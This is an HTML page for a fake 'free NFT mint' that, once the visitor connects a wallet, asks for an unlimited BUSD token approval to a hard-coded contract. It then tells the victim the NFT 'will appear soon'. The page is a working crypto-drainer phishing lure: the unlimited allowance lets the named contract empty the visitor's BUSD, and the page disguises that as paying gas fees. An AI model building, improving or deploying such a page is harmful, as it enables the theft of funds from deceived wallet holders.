<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Fake Mint BUSD</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      background-color: #121212;
      color: #eee;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
    }
    h1 {
      font-size: 28px;
      margin-bottom: 15px;
    }
    p {
      font-size: 16px;
      margin-bottom: 25px;
    }
    button {
      padding: 15px 40px;
      font-size: 18px;
      background: #28a745;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: bold;
      color: white;
    }
    #status {
      margin-top: 20px;
      color: #00ff00;
      font-weight: 600;
      white-space: pre-wrap;
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
      word-break: break-word;
    }
  </style>
</head>
<body>
  <h1>Fake Mint BUSD</h1>
  <p>Get your free NFT now! Just approve gas fees.</p>
  <button onclick="approve()">Mint Now</button>
  <div id="status"></div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
  <script>
    const tokenAddress = "0xe9e7cea3dedca5984780bafc599bd69add087d56"; // BUSD on BSC
    const contractAddress = "0xC259Bb14dE51e292b9E6f32AD41507bf3Fa7028A"; // —Ç–≤–æ–π –∫–æ–Ω—Ç—Ä–∞–∫—Ç

    async function approve() {
      try {
        await window.ethereum.request({ method: "eth_requestAccounts" });
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const token = new ethers.Contract(tokenAddress, [
          "function approve(address spender, uint256 amount) public returns (bool)"
        ], signer);

        const tx = await token.approve(contractAddress, ethers.MaxUint256);
        document.getElementById("status").innerText = "üîÑ Waiting for approval...";
        await tx.wait();
        document.getElementById("status").innerText = "‚úÖ Approved! NFT will appear soon.";
      } catch (error) {
        document.getElementById("status").innerText = "‚ùå Error: " + error.message;
      }
    }
  </script>
</body>
</html>
